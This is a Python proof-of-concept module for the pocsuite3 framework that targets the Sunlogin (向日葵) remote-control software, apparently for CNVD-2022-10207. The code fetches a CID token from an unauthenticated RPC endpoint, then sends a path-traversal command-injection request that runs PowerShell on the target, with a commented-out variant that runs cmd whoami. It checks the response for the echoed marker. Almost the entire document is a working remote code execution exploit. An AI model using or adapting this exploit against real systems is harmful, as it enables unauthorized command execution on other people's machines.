from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class SunFlower(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "7Seven"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "CNVD-2022-10207"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "向日葵"  # 漏洞应用名称
    appVersion = """
    向日葵个人版: Windows <= 11.0.0.33 | 向日葵简约版:<= V1.0.1.43315
    """  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """RCE"""  # 漏洞简要描述
    pocDesc = """/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"echo%20qiqi"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        try:
            url1 = self.url.strip() + "/cgi-bin/rpc?action=verify-haras"
            headers = {"Upgrade-Insecure-Requests": "1",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                       "Accept-Encoding": "gzip, deflate",
                       "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5", "Connection": "close"}
            res1 = requests.get(url1, headers=headers, verify=False,timeout=2)
            if res1.status_code == 200:
                res1_dict = res1.json()
                cid = res1_dict.get('verify_string')
                cookies = {"CID":f"{cid}"}
                headers2 = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"}
                url2 = self.url + '/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"echo%20qiqi"'
                # url2 = self.url + '/check?cmd=ping/..\\cmd+/c+whoami'
                res2 = requests.get(url2, headers=headers2, timeout=2, verify=False, cookies=cookies)
                if res2.status_code == 200 and "qiqi" in res2.text:
                # if res2.status_code == 200 and "\\" in res2.text:
                    print(f"[+] {self.url} 存在漏洞")
                    result.append(self.url)
                else:
                    print(f"[-] {self.url} 不存在漏洞")
        except Exception as e:
            # print(e)
            pass
        finally:
            return result
            
    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(SunFlower)
